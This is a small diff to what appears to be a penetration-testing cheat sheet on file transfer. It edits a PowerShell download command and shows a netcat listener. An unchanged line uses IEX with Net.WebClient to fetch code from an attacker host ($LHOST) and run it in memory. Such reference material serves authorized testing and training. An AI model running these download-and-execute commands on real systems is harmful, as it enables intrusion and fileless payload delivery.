@@ -171,7 +171,7 @@ nc -lp 8888 > outfile
 ```
 ### Windows Powershell
 ```diff
-- powershell (New-Object Net.WebClient).downloadString('$LHOST/file', 'outfile') <- download to disk: need double check
+- powershell (New-Object Net.WebClient).DownloadFile('$LHOST/file', 'outfile') <- download to disk: need double check
 - powershell "IEX(New-Object Net.WebClient).downloadString('$LHOST/file')" <- download and exec on memory
 ```
 ### Certutil
